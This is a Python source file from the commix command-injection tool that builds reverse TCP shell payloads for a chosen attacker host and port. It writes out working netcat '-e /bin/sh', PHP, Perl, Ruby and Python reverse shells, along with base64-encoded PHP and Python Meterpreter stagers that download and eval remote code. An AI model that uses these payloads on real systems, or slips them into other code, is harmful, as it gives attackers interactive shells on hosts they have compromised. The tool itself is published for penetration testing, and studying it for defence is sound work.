#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import base64
from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

    
"""
Set up the netcat reverse TCP connection
"""
def netcat_version(lhost, lport):

  # Netcat alternatives
  NETCAT_ALTERNATIVES = [
    "/bin/nc",
    "/bin/busybox nc",
    "/bin/nc.traditional"
  ]

  while True:
    nc_version = raw_input("""
  ---[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like targets""" + Style.RESET_ALL + """ ]--- 
  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
  Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
  Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 

commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_ALL + """) > """)
    
    # Default Netcat
    if nc_version == '1':
      nc_alternative = NETCAT_ALTERNATIVES[0]
      break
    # Netcat for Busybox
    if nc_version == '2':
      nc_alternative = NETCAT_ALTERNATIVES[1]
      break
    # Netcat-Traditional 
    elif nc_version == '3':
      nc_alternative = NETCAT_ALTERNATIVES[2]
      break
    elif nc_version.lower() == "reverse_tcp": 
      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
      continue
    elif nc_version.lower() == "?": 
      menu.shell_options()
      continue    
    elif nc_version.lower() in settings.SHELL_OPTIONS:
      return nc_version
    else:  
      print Back.RED + "(x) Error: The '" + nc_version + "' option, is not valid." + Style.RESET_ALL
      continue

  cmd = nc_alternative + " " + lhost + " " + lport + " -e /bin/sh"

  return cmd

"""
Set up other [1] reverse tcp shell connections
[1] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
"""
def other_reverse_shells(lhost, lport):

  while True:
    other_shell = raw_input("""
  ---[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like reverse TCP shells""" + Style.RESET_ALL + """ ]---
  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP reverse TCP shell.
  Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl reverse TCP shell.
  Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby reverse TCP shell. 
  Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
  \n  ---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter reverse TCP shells""" + Style.RESET_ALL + """ ]---
  Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
  Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell.  

commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
    # PHP-reverse-shell
    if other_shell == '1':
      other_shell = "php -r '$sock=fsockopen(\"" + lhost + "\"," + lport + ");" \
                "exec(\"/bin/sh -i <%263 >%263 2>%263\");'"
      break
    # Perl-reverse-shell
    elif other_shell == '2':
      other_shell = "perl -e 'use Socket;" \
                "$i=\"" + lhost + "\";" \
                "$p=" + lport + ";" \
                "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
                "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\");" \
                "open(STDOUT,\">%26S\");open(STDERR,\">%26S\");" \
                "exec(\"/bin/sh -i\");};'"
      break
    # Ruby-reverse-shell
    elif other_shell == '3':
      other_shell = "ruby -rsocket -e 'exit if fork;" \
                "c=TCPSocket.new(\"" + lhost + "\"," + lport + ");" \
                "while(cmd=c.gets);" \
                "IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
      break
    # Python-reverse-shell 
    elif other_shell == '4':
      other_shell = "python -c 'import socket,subprocess,os%0d" \
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                "s.connect((\"" + lhost + "\"," + lport + "))%0d" \
                "os.dup2(s.fileno(),0)%0d" \
                "os.dup2(s.fileno(),1)%0d" \
                "os.dup2(s.fileno(),2)%0d" \
                "p=subprocess.call([\"/bin/sh\",\"-i\"])%0d'"
      break
    # PHP-reverse-shell (meterpreter)
    elif other_shell == '5':
      other_shell ="""/*<?php /**/ error_reporting(0); 
$ip = '""" + lhost + """'; $port = """ + lport + """;
if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); 
$s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f))
{ $s = $f($ip, $port); $s_type = 'stream'; }
elseif (($f = 'socket_create') && is_callable($f))
{ $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port);
if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); }
if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4);
break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } 
$a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) 
{ switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break;
case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();"""
      other_shell = base64.b64encode(other_shell)
      if settings.TARGET_OS == "win": 
        other_shell = settings.WIN_PHP_DIR + "php.exe -r \"eval(base64_decode(" +other_shell+ "));\""
      else:
        other_shell = "php -r \"eval(base64_decode(" +other_shell+ "));\""
      break
    # Python-reverse-shell (meterpreter)
    elif other_shell == '6':
      other_shell = """import socket,struct
s=socket.socket(2,1)
s.connect(('""" + lhost + """',""" + lport + """))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(4096)
while len(d)!=l:
  d+=s.recv(4096)
exec(d,{'s':s})"""      
      other_shell = base64.b64encode(other_shell)
      if settings.TARGET_OS == "win": 
        other_shell = settings.WIN_PYTHON_DIR + "python.exe -c \"exec('" +other_shell+ "'.decode('base64'))\""
      else:
        other_shell = "python -c \"exec('" +other_shell+ "'.decode('base64'))\""
        print other_shell
      break
    elif other_shell.lower() == "reverse_tcp": 
      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
      continue
    elif other_shell.lower() in settings.SHELL_OPTIONS:
      return other_shell
    else:  
      print Back.RED + "(x) Error: The '" + other_shell + "' option, is not valid." + Style.RESET_ALL
      continue

  return other_shell

"""
Choose type of reverse TCP connection.
"""
def reverse_tcp_options(lhost, lport):

  while True:
    reverse_tcp_option = raw_input("""   
  ---[ """ + Style.BRIGHT + Fore.BLUE + """Reverse TCP shells""" + Style.RESET_ALL + """ ]---     
  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a Netcat reverse TCP shell.
  Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TCP shells.

commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
    # Option 1 - Netcat shell
    if reverse_tcp_option == '1' :
      reverse_tcp_option = netcat_version(lhost, lport)
      break
    # Option 2 - Other (Netcat-Without-Netcat) shells
    elif reverse_tcp_option == '2' :
      reverse_tcp_option = other_reverse_shells(lhost, lport)
      break
    elif reverse_tcp_option.lower() == "reverse_tcp": 
      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
      continue
    elif reverse_tcp_option.lower() == "?": 
      menu.shell_options()
      continue
    elif reverse_tcp_option.lower() in settings.SHELL_OPTIONS:
      return reverse_tcp_option
    else:
      print Back.RED + "(x) Error: The '" + reverse_tcp_option + "' option, is not valid." + Style.RESET_ALL
      continue

  return reverse_tcp_option

"""
Set up the reverse TCP connection
"""
def configure_reverse_tcp():
  # Set up LHOST for The reverse TCP connection
  while True:
    lhost = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_lhost""" + Style.RESET_ALL + """) > """)
    if lhost.lower() == "reverse_tcp": 
      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL + "\n"
      continue
    elif lhost.lower() == "?": 
      menu.shell_options()
      continue
    elif lhost.lower() in settings.SHELL_OPTIONS:
      lport = lhost
      return lhost, lport
    else:  
      parts = lhost.split('.')
      if len(parts) == 4 and all(part.isdigit() for part in parts) and all(0 <= int(part) <= 255 for part in parts):
        break
      else:	
        print Back.RED + "(x) Error: The IP format is not valid." + Style.RESET_ALL
        continue

  # Set up LPORT for The reverse TCP connection
  while True:
    lport = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_lport""" + Style.RESET_ALL + """) > """)
    if lport.lower() == "reverse_tcp": 
      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL + "\n"
      continue
    elif lport.lower() == "?": 
      menu.shell_options()
      continue
    elif lport.lower() in settings.SHELL_OPTIONS:
      lhost = lport
      return lhost, lport
    else:
      try:  
        if float(lport):
          break
      except ValueError:
        print Back.RED + "(x) Error: The port must be numeric." + Style.RESET_ALL 
        continue
  
  return lhost, lport